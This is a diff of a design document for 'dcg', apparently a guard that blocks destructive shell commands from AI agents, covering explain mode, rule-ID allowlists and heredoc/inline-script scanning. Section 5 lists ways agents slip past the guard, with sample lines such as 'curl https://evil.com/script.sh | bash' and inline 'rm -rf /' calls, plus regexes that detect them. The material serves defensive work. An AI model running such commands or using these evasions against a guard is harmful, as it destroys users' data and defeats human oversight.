 ║                                                                      ║
-║  To allow all hard resets (use with caution):                        ║
-║  • dcg allow --pattern "git reset --hard" --reason "..."             ║
+║  To allow permanently (adds to .dcg/allowlist.toml):                 ║
+║  • dcg allowlist add core.git:hard-reset --reason "Intentional"      ║
 ║                                                                      ║
 ╚══════════════════════════════════════════════════════════════════════╝
 ```
 
-### User Stories
+### Example: False Positive Explanation
 
-**Story 1: Debugging a False Positive**
-> As a developer, I want to understand why `bd create --description="Fix rm -rf bug"` was blocked, so I can add an appropriate allowlist entry.
-
-With explain mode:
-```bash
-$ dcg explain 'bd create --description="Fix rm -rf bug"'
-# Shows that "rm -rf" in the description triggered core.filesystem:rm-rf
-# Suggests: dcg allow --pattern "bd create --description" --context string-argument
 ```
+$ dcg explain 'bd create --description="Fix rm -rf detection"'
 
-**Story 2: Pattern Development**
-> As a pack author, I want to test my new pattern without executing commands, so I can verify it matches what I expect.
-
-With explain mode:
-```bash
-$ dcg explain "docker system prune --all --force"
-# Shows whether containers.docker pack is reached
-# Shows which pattern matched (or didn't)
-# Shows timing to verify performance is acceptable
-```
-
-**Story 3: Learning the System**
-> As a new user, I want to understand what DCG protects against, so I can trust it and configure it appropriately.
-
-With explain mode:
-```bash
-$ dcg explain "git push --force origin main"
-# Educational output showing the strict_git pack
-# Explains why force-push to main is dangerous
-# Shows alternatives like --force-with-lease
+╔══════════════════════════════════════════════════════════════════════╗
+║                     DCG Decision Analysis                            ║
+║                                                                      ║
+║  Input:    bd create --description="Fix rm -rf detection"            ║
+║  Decision: ALLOW                                                     ║
+║  Latency:  0.124ms                                                   ║
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  EXECUTION CONTEXT ANALYSIS                                          ║
+║  ─────────────────────────────────────────────────────────────────── ║
+║                                                                      ║
+║  Span Analysis:                                                      ║
+║  ┌─────────────────────────────────────────────────────────────────┐ ║
+║  │ [0:2]   "bd"              Executed  (command word)             │ ║
+║  │ [3:9]   "create"          Argument                              │ ║
+║  │ [10:23] "--description"   Argument  (safe string flag)         │ ║
+║  │ [24:47] "Fix rm -rf..."   Data      (documentation content)    │ ║
+║  └─────────────────────────────────────────────────────────────────┘ ║
+║                                                                      ║
+║  ✓ Safe String-Arg Registry: MATCHED                                ║
+║    Command: bd create                                                ║
+║    Flag: --description                                               ║
+║    Context: Documentation                                            ║
+║                                                                      ║
+║  → Pattern matching SKIPPED for Data spans                           ║
+║  → Result: ALLOW                                                     ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
 ```
 
 ### Technical Design
-
-#### New Module: `src/explain.rs`
 
 ```rust
 /// Trace of a single decision step in the pipeline.
@@ -207,14 +945,14 @@ pub struct TraceStep {
 
 #[derive(Debug, Clone)]
 pub enum TraceDetails {
-    InputParsing {
-        tool_name: String,
-        command: String,
-    },
     QuickReject {
-        keywords_checked: Vec<&'static str>,
+        enabled_keywords: Vec<&'static str>,
         keyword_found: Option<(&'static str, usize)>,
         result: QuickRejectResult,
+    },
+    ContextAnalysis {
+        spans: Vec<Span>,
+        safe_string_match: Option<SafeContext>,
     },
     Normalization {
         input: String,
@@ -225,17 +963,12 @@ pub enum TraceDetails {
         entries_checked: usize,
         matched_entry: Option<AllowlistEntry>,
     },
-    SafePatternEval {
-        pack: String,
+    PackEvaluation {
+        tier: usize,
+        tier_name: String,
+        pack_id: String,
         patterns_checked: Vec<PatternResult>,
-        matched: Option<String>,
-    },
-    DestructivePatternEval {
-        pack: String,
-        pattern_name: String,
-        regex: String,
-        matched_span: Option<(usize, usize)>,
-        reason: String,
+        matched: Option<Match>,
     },
 }
 
@@ -246,626 +979,606 @@ pub struct ExplainTrace {
     pub decision: Decision,
     pub steps: Vec<TraceStep>,
     pub total_duration: Duration,
+    pub match_identity: Option<MatchIdentity>,
     pub suggestions: Vec<Suggestion>,
 }
 
-/// Suggestion for the user.
-#[derive(Debug, Clone)]
-pub struct Suggestion {
-    pub category: SuggestionCategory,
-    pub text: String,
-    pub command: Option<String>,
-}
-
-#[derive(Debug, Clone)]
-pub enum SuggestionCategory {
-    SafeAlternative,
-    AllowlistEntry,
-    Documentation,
-}
-```
-
-#### Integration with Decision Pipeline
-
-The key insight is that the decision pipeline already has all this information—we just discard it. The change is to optionally collect it:
-
-```rust
-/// Check a command, optionally collecting an explain trace.
-pub fn check_command_with_trace(
-    command: &str,
-    config: &Config,
-    trace: Option<&mut ExplainTrace>,
-) -> Decision {
-    let start = Instant::now();
-
-    // Step 1: Quick reject
-    let qr_start = Instant::now();
-    let qr_result = global_quick_reject(command, config);
-    if let Some(t) = trace.as_mut() {
-        t.steps.push(TraceStep {
-            name: "Quick Reject Filter",
-            duration: qr_start.elapsed(),
-            details: TraceDetails::QuickReject { /* ... */ },
-        });
-    }
-
-    if qr_result == QuickRejectResult::Skip {
-        return Decision::Allow;
-    }
-
-    // ... continue pipeline, recording each step
-}
-```
-
-In hook mode, we pass `None` for the trace, so there's zero overhead:
-
-```rust
-// Hook mode (production): no trace overhead
-let decision = check_command_with_trace(&command, &config, None);
-
-// Explain mode: collect full trace
-let mut trace = ExplainTrace::new(&command);
-let decision = check_command_with_trace(&command, &config, Some(&mut trace));
-println!("{}", trace.format(OutputFormat::Pretty));
-```
-
-#### CLI Integration
-
-```rust
-#[derive(Parser)]
-enum Command {
-    /// Explain why a command would be blocked or allowed
-    Explain {
-        /// The command to analyze
-        command: String,
-
-        /// Output format
-        #[arg(long, default_value = "pretty")]
-        format: OutputFormat,
-
-        /// Show timing information
-        #[arg(long)]
-        timing: bool,
-
-        /// Show all patterns checked, not just the match
-        #[arg(long)]
-        verbose: bool,
-    },
-    // ... other commands
-}
-
-#[derive(ValueEnum, Clone)]
-enum OutputFormat {
-    Pretty,  // Colorful box drawing (default)
-    Json,    // Machine-readable JSON
-    Compact, // Single-line summary
+/// Stable identity for a match (used for allowlisting).
+#[derive(Debug, Clone, Serialize)]
+pub struct MatchIdentity {
+    pub pack_id: String,
+    pub pattern_name: String,
+    pub rule_id: String,  // "pack_id:pattern_name"
 }
 ```
 
 ### Output Formats
 
-#### Pretty (Default)
+**Pretty (Default)**: Colorful box drawing for terminals
+**JSON**: Machine-readable for tooling
+**Compact**: Single-line for logs
 
-The box-drawing format shown above, with colors:
-- Green for allowed/passed steps
-- Red for blocked/matched patterns
-- Yellow for warnings
-- Blue for suggestions
-- Dim gray for timing information
-
-#### JSON (Machine-Readable)
-
-```json
+```bash
+$ dcg explain "git reset --hard" --format json
 {
-  "command": "git reset --hard HEAD~5",
+  "command": "git reset --hard",
   "decision": "deny",
-  "total_duration_us": 847,
-  "steps": [
-    {
-      "name": "Quick Reject Filter",
-      "duration_us": 3,
-      "result": "passed",
-      "keyword_found": "git",
-      "position": 0
-    },
-    {
-      "name": "Destructive Pattern Evaluation",
-      "duration_us": 156,
-      "result": "matched",
-      "pack": "core.git",
-      "pattern": "hard-reset",
-      "regex": "git\\s+reset\\s+--hard",
-      "matched_text": "git reset --hard",
-      "matched_span": [0, 15],
-      "reason": "Hard reset can permanently lose commits"
-    }
-  ],
-  "suggestions": [
-    {
-      "category": "safe_alternative",
-      "text": "git reset --soft HEAD~5",
-      "description": "Keeps changes staged"
-    }
-  ]
+  "match_identity": {
+    "pack_id": "core.git",
+    "pattern_name": "hard-reset",
+    "rule_id": "core.git:hard-reset"
+  },
+  "context_analysis": {
+    "spans": [...],
+    "safe_string_match": null
+  },
+  "suggestions": [...]
 }
-```
 
-#### Compact (One-Line)
-
-```
+$ dcg explain "git reset --hard" --format compact
 DENY core.git:hard-reset "git reset --hard" — Hard reset can permanently lose commits (0.847ms)
 ```
-
-### Suggestions Database
-
-Each destructive pattern should have associated suggestions:
-
-```rust
-static SUGGESTIONS: LazyLock<HashMap<&str, Vec<Suggestion>>> = LazyLock::new(|| {
-    hashmap! {
-        "core.git:hard-reset" => vec![
-            Suggestion::safe_alt("git reset --soft HEAD~N", "Keeps changes staged"),
-            Suggestion::safe_alt("git reset --mixed HEAD~N", "Keeps changes unstaged"),
-            Suggestion::safe_alt("git stash", "Saves changes before reset"),
-            Suggestion::safe_alt("git revert HEAD~N..HEAD", "Creates inverse commits"),
-        ],
-        "core.git:force-push" => vec![
-            Suggestion::safe_alt("git push --force-with-lease", "Fails if remote has new commits"),
-            Suggestion::doc("https://docs.dcg.dev/patterns/force-push"),
-        ],
-        "core.filesystem:rm-rf" => vec![
-            Suggestion::safe_alt("rm -ri", "Interactive mode, confirms each file"),
-            Suggestion::safe_alt("trash-put", "Moves to trash instead of deleting"),
-            Suggestion::safe_alt("mv /path /tmp/backup-$(date +%s)", "Backup first"),
-        ],
-        // ... more patterns
-    }
-});
-```
-
-### Edge Cases
-
-1. **Very long commands**: Truncate display but show full command in JSON output
-2. **Binary/unprintable content**: Escape or replace with placeholders
-3. **Multiple matches**: Show all matches in order, highlight first (decisive) match
-4. **No match (allowed)**: Show that all patterns were checked with no match
-5. **Allowlist match**: Show which allowlist entry matched and why
-
-### Success Metrics
-
-| Metric | Target | Measurement |
-|--------|--------|-------------|
-| User understanding | 90% can explain why a command was blocked | Survey |
-| Debug time | <2 minutes to understand any block | User testing |
-| False positive resolution | 80% resolved with explain + allow | Telemetry |
-| Adoption | 50% of users use explain at least once | CLI analytics |
 
 ### Implementation Phases
 
 **Phase 1: Core Trace Infrastructure (2-3 days)**
 - Add `ExplainTrace` struct and builder
-- Modify decision pipeline to optionally collect trace
+- Modify evaluation pipeline to optionally collect trace
 - Basic pretty-print output
 
-**Phase 2: Rich Output (1-2 days)**
+**Phase 2: Context Analysis Display (1-2 days)**
+- Show span classification in output
+- Show safe string-arg registry matches
+- Highlight data vs executed spans
+
+**Phase 3: Rich Output (1-2 days)**
 - JSON and compact formats
 - Match visualization with highlighting
 - Timing breakdown
 
-**Phase 3: Suggestions (2-3 days)**
+**Phase 4: Suggestions (2-3 days)**
 - Build suggestions database for all patterns
 - Context-aware suggestion selection
-- Documentation links
-
-**Phase 4: Polish (1-2 days)**
-- Error handling for malformed commands
-- Performance optimization (ensure zero overhead in hook mode)
-- Documentation and examples
+- Allowlist commands in output
 
 ---
 
-## 2. Project-Specific Allowlists with Learning
+## 4. Allowlisting by Rule ID
 
 ### Overview
 
-Project-specific allowlists allow users to define rules that override DCG's default behavior for their specific project. Combined with an interactive learning mode, the system can automatically build allowlists from user feedback on false positives.
+Users can allowlist specific rules by their stable identity `(pack_id, pattern_name)` rather than writing dangerous raw regex patterns. This is safer, simpler, and more maintainable.
 
-### The Problem It Solves
+### Why Rule ID, Not Regex?
 
-DCG's pattern-based approach inevitably produces false positives. Some examples:
+| Approach | Example | Safety | Maintainability |
+|----------|---------|--------|-----------------|
+| Raw regex | `pattern = "rm -rf.*"` | ⚠️ Dangerous | ⚠️ Fragile |
+| Rule ID | `rule = "core.git:hard-reset"` | ✓ Safe | ✓ Stable |
 
-1. **Documentation commands**: `bd create --description="This blocks rm -rf attacks"`
-2. **Commit messages**: `git commit -m "Fix the git reset --hard detection"`
-3. **Search patterns**: `rg "rm -rf" src/` (searching for the pattern, not executing it)
-4. **Echo/print statements**: `echo "Example: docker system prune --all"`
-5. **Test fixtures**: Commands in test files that define what to block
-
-Currently, users have no recourse except to:
-- Disable DCG entirely (dangerous)
-- Modify the source code (impractical)
-- Wait for upstream fixes (slow)
+Rule ID allowlisting:
+- Only bypasses the specific rule that matched
+- Cannot accidentally match unrelated commands
+- Survives pattern updates (regex changes don't break allowlist)
+- Easy to audit ("which rules are bypassed?")
 
 ### The Solution
 
-A `.dcg/allowlist.toml` file that lives in the project repository:
-
 ```toml
 # .dcg/allowlist.toml
-# Project-specific allowlist for DCG
-# This file is committed to the repository and shared with the team.
 
-# Beads CLI uses descriptions that may contain dangerous patterns as examples
+# Allowlist by rule ID (recommended)
 [[allow]]
-command_prefix = "bd create"
-context = "string-argument"
-reason = "Beads CLI descriptions are documentation, not executable code"
+rule = "core.git:hard-reset"
+reason = "Intentional hard resets during development"
 added_by = "alice@example.com"
 added_at = 2026-01-07T15:30:00Z
+environments = ["development"]  # Optional: only in dev
 
-# Git commit messages may reference dangerous commands being fixed
+# Allowlist by rule ID with conditions
 [[allow]]
-command_prefix = "git commit -m"
-context = "string-argument"
-reason = "Commit messages are documentation"
-added_by = "interactive"
-added_at = 2026-01-07T16:45:00Z
+rule = "core.filesystem:rm-rf-variable"
+reason = "CI cleanup script, variable is validated upstream"
+conditions = { CI = "true" }
 
-# Ripgrep searching for patterns is safe
+# Allowlist by exact command (for one-off cases)
 [[allow]]
-command_prefix = "rg"
-context = "search-pattern"
-reason = "Searching for patterns is not executing them"
+exact_command = "rm -rf /tmp/dcg-test-artifacts"
+reason = "Test cleanup"
+expires_at = 2026-06-01T00:00:00Z
 
-# Specific command that was a false positive
-[[allow]]
-exact_command = "rm -rf /tmp/dcg-test-*"
-reason = "Test cleanup in CI, validated path"
-expires_at = 2026-06-01T00:00:00Z  # Optional expiration
-
-# Pattern-based allowlist (use with caution)
-[[allow]]
-pattern = "echo \"Example:.*\""
-reason = "Echo statements with 'Example:' prefix are documentation"
-added_by = "bob@example.com"
-risk_acknowledged = true  # Required for pattern-based allows
-```
-
-### Interactive Learning Mode
-
-When DCG blocks a command in interactive mode, it can prompt the user:
-
-```
-╔══════════════════════════════════════════════════════════════╗
-║  ⚠️  BLOCKED: Potentially Destructive Command                ║
-╠══════════════════════════════════════════════════════════════╣
-║                                                              ║
-║  Command: bd create --description="Blocks rm -rf attacks"    ║
-║  Pattern: core.filesystem:rm-rf                              ║
-║  Matched: "rm -rf" in argument string                        ║
-║                                                              ║
-╠══════════════════════════════════════════════════════════════╣
-║                                                              ║
-║  This appears to be a string argument, not executable code.  ║
-║                                                              ║
-║  Options:                                                    ║
-║  [1] Block this command (default)                            ║
-║  [2] Allow this once and continue                            ║
-║  [3] Add to project allowlist (remembers for future)         ║
-║  [4] Explain why this was blocked                            ║
-║                                                              ║
-║  Choice [1/2/3/4]:                                           ║
-╚══════════════════════════════════════════════════════════════╝
-```
-
-If the user selects `[3]`, DCG:
-1. Prompts for a reason (or uses auto-detected context)
-2. Appends to `.dcg/allowlist.toml`
-3. Allows the command to proceed
-4. Never blocks this pattern again for this project
-
-### Allowlist Entry Types
-
-#### 1. Exact Command Match
-
-```toml
-[[allow]]
-exact_command = "rm -rf /tmp/test-artifacts"
-reason = "CI cleanup of test artifacts"
-```
-
-- Most restrictive (safest)
-- Only matches the exact command string
-- Good for specific commands that are known-safe
-
-#### 2. Command Prefix Match
-
-```toml
+# Allowlist by command prefix (for known-safe tools)
 [[allow]]
 command_prefix = "bd create"
 context = "string-argument"
 reason = "Beads CLI descriptions are documentation"
 ```
 
-- Matches any command starting with the prefix
-- Combined with `context` for additional safety
-- Good for tools with known-safe argument patterns
-
-#### 3. Pattern Match
-
-```toml
-[[allow]]
-pattern = "echo \"Example:.*\""
-reason = "Documentation examples"
-risk_acknowledged = true  # REQUIRED
-```
-
-- Most flexible (least safe)
-- Requires explicit `risk_acknowledged = true`
-- Good for complex patterns but requires careful review
-
-### Context Types
-
-The `context` field provides semantic understanding of why a match is safe:
-
-| Context | Meaning | Example |
-|---------|---------|---------|
-| `string-argument` | Match is inside a quoted string argument | `git commit -m "fix rm -rf"` |
-| `search-pattern` | Match is a search/grep pattern | `rg "rm -rf" src/` |
-| `heredoc-example` | Match is in a heredoc used as documentation | `cat << 'EOF'` |
-| `comment` | Match is in a comment | `# Don't use rm -rf` |
-| `disabled-code` | Match is in disabled/commented code | `# rm -rf /tmp` |
-
 ### CLI Commands
 
 ```bash
-# Add an allowlist entry manually
-$ dcg allow "bd create --description" --context string-argument --reason "Beads descriptions"
-Added to .dcg/allowlist.toml
+# Add allowlist entry by rule ID (recommended)
+$ dcg allowlist add core.git:hard-reset --reason "Development workflow"
+Added rule 'core.git:hard-reset' to .dcg/allowlist.toml
 
-# Add with expiration (temporary allow)
-$ dcg allow --once "rm -rf /tmp/old-build"
-Allowed once. Not added to allowlist.
+# Add with conditions
+$ dcg allowlist add core.filesystem:rm-rf-variable \
+    --reason "CI cleanup" \
+    --condition "CI=true"
 
-$ dcg allow "rm -rf /tmp/ci-*" --expires 2026-02-01 --reason "CI cleanup, expires Feb 1"
-Added to .dcg/allowlist.toml with expiration
+# Add exact command (for one-off)
+$ dcg allowlist add-command "rm -rf /tmp/old-build" \
+    --reason "One-time cleanup" \
+    --expires 2026-02-01
 
-# List current allowlist
-$ dcg allowlist
-┌─────────────────────────────────────────────────────────────────┐
-│ Project Allowlist: .dcg/allowlist.toml                          │
-├──────────────────────┬──────────────────┬───────────────────────┤
-│ Pattern              │ Context          │ Reason                │
-├──────────────────────┼──────────────────┼───────────────────────┤
-│ bd create            │ string-argument  │ Beads descriptions    │
-│ git commit -m        │ string-argument  │ Commit messages       │
-│ rg                   │ search-pattern   │ Search is safe        │
-└──────────────────────┴──────────────────┴───────────────────────┘
+# List allowlist entries
+$ dcg allowlist list
+┌─────────────────────────────────────────────────────────────────────────┐
+│ Allowlist Entries (.dcg/allowlist.toml)                                 │
+├────────────────────────────┬──────────────────────────┬─────────────────┤
+│ Type                       │ Rule/Pattern             │ Reason          │
+├────────────────────────────┼──────────────────────────┼─────────────────┤
+│ Rule ID                    │ core.git:hard-reset      │ Dev workflow    │
+│ Rule ID + Condition        │ core.filesystem:rm-rf-*  │ CI cleanup      │
+│ Exact Command (expires)    │ rm -rf /tmp/old-build    │ One-time        │
+│ Command Prefix             │ bd create                │ Documentation   │
+└────────────────────────────┴──────────────────────────┴─────────────────┘
 
-# Remove an allowlist entry
-$ dcg allowlist remove "bd create"
-Removed from .dcg/allowlist.toml
+# Remove entry
+$ dcg allowlist remove core.git:hard-reset
+Removed rule 'core.git:hard-reset' from .dcg/allowlist.toml
 
-# Validate allowlist (check for risky entries)
+# Validate allowlist
 $ dcg allowlist validate
-⚠️  Warning: Pattern "rm -rf.*" is very broad. Consider using exact_command.
-✓  3 entries validated
+✓ 4 entries validated
+```
+
+### How Rule ID Allowlisting Works
+
+```rust
+/// Check if a match is allowlisted.
+pub fn check_allowlist(
+    match_result: &Match,
+    command: &str,
+    env: &HashMap<String, String>,
+    allowlist: &Allowlist,
+) -> Option<AllowReason> {
+    for entry in &allowlist.entries {
+        match entry {
+            AllowEntry::RuleId { rule, conditions, .. } => {
+                let rule_matches = rule == &match_result.rule_id()
+                    || rule.ends_with('*') && match_result.rule_id().starts_with(&rule[..rule.len()-1]);
+
+                let conditions_met = conditions.as_ref().map_or(true, |c| {
+                    c.iter().all(|(k, v)| env.get(k) == Some(v))
+                });
+
+                if rule_matches && conditions_met {
+                    return Some(AllowReason::RuleId {
+                        rule: rule.clone(),
+                        entry_reason: entry.reason().to_string(),
+                    });
+                }
+            }
+            AllowEntry::ExactCommand { exact_command, expires_at, .. } => {
+                if command == exact_command && !is_expired(expires_at) {
+                    return Some(AllowReason::ExactCommand { /* ... */ });
+                }
+            }
+            // ... other entry types
+        }
+    }
+    None
+}
+```
+
+### Integration with Explain Mode
+
+```
+$ dcg explain "git reset --hard HEAD" --with-allowlist
+
+[... normal trace output ...]
+
+╠══════════════════════════════════════════════════════════════════════╣
+║                                                                      ║
+║  ALLOWLIST CHECK                                                     ║
+║  ─────────────────────────────────────────────────────────────────── ║
+║                                                                      ║
+║  Match Rule ID: core.git:hard-reset                                  ║
+║                                                                      ║
+║  ✓ ALLOWLISTED                                                       ║
+║    Entry: rule = "core.git:hard-reset"                               ║
+║    Reason: Development workflow                                      ║
+║    Added by: alice@example.com                                       ║
+║    Added at: 2026-01-07T15:30:00Z                                    ║
+║                                                                      ║
+║  → Decision overridden: DENY → ALLOW                                 ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
 ```
 
 ### Security Considerations
 
-#### 1. Allowlist Audit Trail
+1. **Rule ID is constrained**: Can only allowlist rules that exist
+2. **Wildcards are limited**: `core.git:*` is allowed, but not `*:*`
+3. **Audit trail**: Every entry has `added_by`, `added_at`, `reason`
+4. **Expiration**: Temporary allowlists expire automatically
+5. **Conditions**: Can restrict to specific environments (CI only, etc.)
 
-Every allowlist entry includes:
-- `added_by`: Who added it (email, username, or "interactive")
-- `added_at`: When it was added (ISO 8601 timestamp)
-- `reason`: Why it's allowed
+### Implementation Phases
 
-This creates an audit trail that can be reviewed in code review.
+**Phase 1: Core Allowlist (2-3 days)**
+- Allowlist data structures with rule ID support
+- Load `.dcg/allowlist.toml` on startup
+- Integration with evaluation pipeline (check after match)
 
-#### 2. Risk Acknowledgment
+**Phase 2: CLI Commands (1-2 days)**
+- `dcg allowlist add`, `list`, `remove`, `validate`
+- Proper TOML formatting
 
-Pattern-based allowlists require explicit acknowledgment:
+**Phase 3: Conditions & Expiration (1-2 days)**
+- Environment-based conditions
+- Expiration handling
+- Wildcards for rule families
 
-```toml
-[[allow]]
-pattern = "rm -rf /tmp/.*"
-reason = "Cleanup temp files"
-risk_acknowledged = true  # Without this, dcg will warn/reject
+---
+
+## 5. Tiered Heredoc & Inline Script Scanning
+
+### Overview
+
+Agents can hide destructive behavior inside heredocs, inline scripts, and piped interpreters. This improvement adds tiered detection that keeps the common case fast while catching sophisticated bypasses.
+
+### The Problem
+
+```bash
+# Bypasses current detection:
+python3 << EOF
+import os
+os.system("rm -rf /")
+EOF
+
+# Also bypasses:
+bash -c "git reset --hard"
+curl https://evil.com/script.sh | bash
+node -e "require('child_process').execSync('rm -rf /')"
 ```
 
-#### 3. Expiration
+Regex-only top-level command scanning misses these, creating dangerous false negatives.
 
-Temporary allowlists can have expiration dates:
+### The Solution: Tiered Architecture
 
-```toml
-[[allow]]
-exact_command = "docker system prune -af"
-reason = "One-time cleanup for migration"
-expires_at = 2026-01-15T00:00:00Z
+```
+Tier 1: Ultra-Fast Trigger Detection (<100μs)
+  │ Detect heredoc operators, inline flags, pipe patterns
+  │ High recall, some false positives OK
+  │ If no trigger found → ALLOW (fast path)
+  ▼
+Tier 2: Bounded Extraction (<1ms)
+  │ Extract heredoc bodies, inline script strings
+  │ Enforce size/line/time limits
+  │ On failure → fail-open with warning
+  ▼
+Tier 3: AST-Aware Matching (<5ms)
+  │ Parse extracted content with ast-grep/tree-sitter
+  │ Match language-specific destructive patterns
+  │ Structural matching, not substring
+  ▼
+Decision: ALLOW or DENY(pack, pattern, reason)
 ```
 
-After expiration, the entry is ignored (and can be cleaned up).
+### Tier 1: Trigger Detection
 
-#### 4. Validation on Load
-
-DCG validates the allowlist on load:
-- Warns about overly broad patterns
-- Errors on invalid regex in patterns
-- Warns about expired entries
-- Checks for conflicting entries
-
-### Team Workflow
-
-1. **Developer hits false positive** → Uses interactive mode or `dcg allow`
-2. **Entry added to `.dcg/allowlist.toml`** → Committed with code
-3. **Code review** → Team reviews allowlist changes like any code
-4. **Merged** → Entire team benefits from the allowlist entry
-
-This creates a collaborative, auditable process for managing false positives.
-
-### Technical Design
-
-#### Allowlist Module: `src/allowlist.rs`
+Fast regex to identify commands that need deeper analysis:
 
 ```rust
-use serde::{Deserialize, Serialize};
-use std::path::Path;
+/// Patterns that trigger deeper heredoc/inline analysis.
+static HEREDOC_TRIGGERS: LazyLock<RegexSet> = LazyLock::new(|| {
+    RegexSet::new(&[
+        // Heredoc operators
+        r"<<-?['\"\\]?\w+",           // << EOF, <<-EOF, <<'EOF', etc.
+        r"<<<",                        // Here-string
 
-#[derive(Debug, Deserialize, Serialize)]
-pub struct Allowlist {
-    #[serde(default)]
-    pub allow: Vec<AllowEntry>,
+        // Inline script flags
+        r"\b(bash|sh|zsh|fish)\s+-c\s",
+        r"\b(python|python3|python2)\s+-c\s",
+        r"\b(ruby|irb)\s+-e\s",
+        r"\b(perl)\s+-e\s",
+        r"\b(node|nodejs)\s+-e\s",
+        r"\b(php)\s+-r\s",
+
+        // Pipe to interpreter
+        r"\|\s*(bash|sh|zsh)\b",
+        r"\|\s*(python|python3)\b",
+        r"\|\s*(ruby|perl|node)\b",
+        r"curl\s.*\|\s*\w+",
+        r"wget\s.*\|\s*\w+",
+    ]).unwrap()
+});
+
+/// Quick check for heredoc/inline script patterns.
+pub fn needs_deep_analysis(command: &str) -> bool {
+    HEREDOC_TRIGGERS.is_match(command)
+}
+```
+
+### Tier 2: Bounded Extraction
+
+Extract content with strict limits:
+
+```rust
+/// Limits for heredoc extraction.
+pub const HEREDOC_LIMITS: ExtractionLimits = ExtractionLimits {
+    max_body_bytes: 1_048_576,  // 1MB
+    max_body_lines: 10_000,
+    max_heredocs: 10,           // Per command
+    timeout_ms: 50,             // Hard timeout
+};
+
+/// Result of heredoc extraction.
+#[derive(Debug)]
+pub struct HeredocContent {
+    pub delimiter: String,
+    pub body: String,
+    pub language_hint: Option<Language>,
+    pub is_quoted: bool,        // <<'EOF' vs <<EOF
+    pub strip_tabs: bool,       // <<- vs <<
 }
 
-#[derive(Debug, Deserialize, Serialize)]
-#[serde(untagged)]
-pub enum AllowEntry {
-    Exact(ExactAllow),
-    Prefix(PrefixAllow),
-    Pattern(PatternAllow),
-}
-
-#[derive(Debug, Deserialize, Serialize)]
-pub struct ExactAllow {
-    pub exact_command: String,
-    pub reason: String,
-    #[serde(default)]
-    pub added_by: Option<String>,
-    #[serde(default)]
-    pub added_at: Option<DateTime<Utc>>,
-    #[serde(default)]
-    pub expires_at: Option<DateTime<Utc>>,
-}
-
-#[derive(Debug, Deserialize, Serialize)]
-pub struct PrefixAllow {
-    pub command_prefix: String,
-    #[serde(default)]
-    pub context: Option<AllowContext>,
-    pub reason: String,
-    // ... metadata fields
-}
-
-#[derive(Debug, Deserialize, Serialize)]
-pub struct PatternAllow {
-    pub pattern: String,
-    pub reason: String,
-    pub risk_acknowledged: bool,  // Required to be true
-    // ... metadata fields
-}
-
-#[derive(Debug, Deserialize, Serialize)]
-#[serde(rename_all = "kebab-case")]
-pub enum AllowContext {
-    StringArgument,
-    SearchPattern,
-    HeredocExample,
-    Comment,
-    DisabledCode,
-}
-
-impl Allowlist {
-    /// Load allowlist from project directory.
-    pub fn load(project_root: &Path) -> Result<Self, AllowlistError> {
-        let path = project_root.join(".dcg/allowlist.toml");
-        if !path.exists() {
-            return Ok(Self::default());
-        }
-        let content = std::fs::read_to_string(&path)?;
-        let allowlist: Self = toml::from_str(&content)?;
-        allowlist.validate()?;
-        Ok(allowlist)
+/// Extract heredoc bodies from a command.
+pub fn extract_heredocs(
+    command: &str,
+    limits: &ExtractionLimits,
+) -> Result<Vec<HeredocContent>, ExtractionError> {
+    // Early size check
+    if command.len() > limits.max_body_bytes {
+        return Err(ExtractionError::TooLarge);
     }
 
-    /// Check if a command matches any allowlist entry.
-    pub fn matches(&self, command: &str) -> Option<&AllowEntry> {
-        for entry in &self.allow {
-            if entry.is_expired() {
-                continue;
-            }
-            if entry.matches(command) {
-                return Some(entry);
-            }
+    let start = Instant::now();
+    let mut heredocs = Vec::new();
+
+    for heredoc_match in find_heredoc_operators(command) {
+        if start.elapsed().as_millis() > limits.timeout_ms as u128 {
+            tracing::warn!("Heredoc extraction timeout, failing open");
+            return Err(ExtractionError::Timeout);
         }
-        None
+
+        if heredocs.len() >= limits.max_heredocs {
+            tracing::warn!("Too many heredocs, stopping extraction");
+            break;
+        }
+
+        if let Some(content) = extract_single_heredoc(command, &heredoc_match, limits)? {
+            heredocs.push(content);
+        }
     }
 
-    /// Add a new entry and save to disk.
-    pub fn add_and_save(&mut self, entry: AllowEntry, path: &Path) -> Result<(), AllowlistError> {
-        self.allow.push(entry);
-        let content = toml::to_string_pretty(self)?;
-        std::fs::write(path, content)?;
-        Ok(())
+    Ok(heredocs)
+}
+
+/// Extract inline script content (bash -c "...", python -c "...", etc.)
+pub fn extract_inline_scripts(command: &str) -> Vec<InlineScript> {
+    let mut scripts = Vec::new();
+
+    for pattern in INLINE_SCRIPT_PATTERNS {
+        for cap in pattern.captures_iter(command) {
+            if let Some(script_content) = cap.get(1) {
+                scripts.push(InlineScript {
+                    interpreter: extract_interpreter(&cap),
+                    content: unescape_string(script_content.as_str()),
+                    language: infer_language(&cap),
+                });
+            }
+        }
+    }
+
+    scripts
+}
+```
+
+### Tier 3: AST-Aware Matching
+
+Use ast-grep-core for structural pattern matching:
+
+```rust
+/// AST patterns for detecting destructive code by language.
+static AST_PATTERNS: LazyLock<HashMap<Language, Vec<AstPattern>>> = LazyLock::new(|| {
+    hashmap! {
+        Language::Python => vec![
+            AstPattern::new("os.system($CMD)", "Shell execution via os.system"),
+            AstPattern::new("subprocess.run($$$, shell=True)", "Shell execution via subprocess"),
+            AstPattern::new("subprocess.call($$$, shell=True)", "Shell execution via subprocess"),
+            AstPattern::new("shutil.rmtree($PATH)", "Recursive directory deletion"),
+            AstPattern::new("os.remove($PATH)", "File deletion"),
+            AstPattern::new("os.unlink($PATH)", "File deletion"),
+            AstPattern::new("exec($CODE)", "Dynamic code execution"),
+            AstPattern::new("eval($CODE)", "Dynamic code evaluation"),
+        ],
+        Language::JavaScript => vec![
+            AstPattern::new("child_process.exec($CMD)", "Shell execution"),
+            AstPattern::new("child_process.execSync($CMD)", "Shell execution"),
+            AstPattern::new("child_process.spawn($CMD, $$$)", "Process spawn"),
+            AstPattern::new("fs.rmSync($PATH, $$$)", "Recursive deletion"),
+            AstPattern::new("fs.rmdirSync($PATH, $$$)", "Directory deletion"),
+            AstPattern::new("eval($CODE)", "Dynamic code evaluation"),
+        ],
+        Language::Ruby => vec![
+            AstPattern::new("system($CMD)", "Shell execution"),
+            AstPattern::new("`$CMD`", "Shell execution via backticks"),
+            AstPattern::new("exec($CMD)", "Shell execution"),
+            AstPattern::new("FileUtils.rm_rf($PATH)", "Recursive deletion"),
+            AstPattern::new("eval($CODE)", "Dynamic code evaluation"),
+        ],
+        Language::Bash => vec![
